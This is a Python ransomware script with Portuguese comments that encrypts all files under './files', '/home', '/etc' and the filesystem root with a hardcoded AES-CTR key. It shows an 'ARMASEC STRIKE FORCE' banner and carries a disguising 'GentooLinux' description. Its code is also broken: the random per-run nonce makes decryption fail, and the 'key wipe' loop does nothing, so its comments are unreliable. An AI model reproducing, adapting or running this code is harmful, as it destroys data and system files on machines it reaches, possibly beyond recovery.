import os
import argparse
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
import Crypter
import Discovery

# --------------
# A senha pode ter os seguintes tamanhos
# 128/192/256 bits -1
# --------------

HARDCODED_KEY = b'a81c5c5b93e4df73d6e4e3a2c4a64fb7'


def arg_parser():
    parser = argparse.ArgumentParser(description="GentooLinux")
    parser.add_argument('-d', '--decrypt', help='decripta os arquivos [default: no]', action='store_true')
    return parser


def main():
    parser = arg_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print('ARMASEC STRIKE FORCE')
        print('-----------------------------------------------------------------')
        print('Seus arquivos foram criptografados')
        print('Para decriptá-los utilize a seguinte senha: {}'.format(HARDCODED_KEY.decode()))
        key = input('Digite a senha: ').encode()
    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY

    nonce = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CTR(nonce))
    cryptor = cipher.encryptor()
    decryptor = cipher.decryptor()

    if not decrypt:
        cryptFn = cryptor.update

        init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
        startDirs = [init_path, '/home', '/etc', '/']

        for currentDir in startDirs:
            for filename in Discovery.discovery(currentDir):
                Crypter.change_files(filename, cryptFn)

        # limpa a chave de criptografia da memória
        for _ in range(100):
            pass

        # Após a encriptação, você pode alterar o secure boot, wallpaper
        # código da zueira aqui
        pass

    else:
        cryptFn = decryptor.update

        init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
        startDirs = [init_path, '/home', '/etc', '/']

        for currentDir in startDirs:
            for filename in Discovery.discovery(currentDir):
                Crypter.change_files(filename, cryptFn)

        # limpa a chave de criptografia da memória
        for _ in range(100):
            pass


if __name__ == '__main__':
    main()
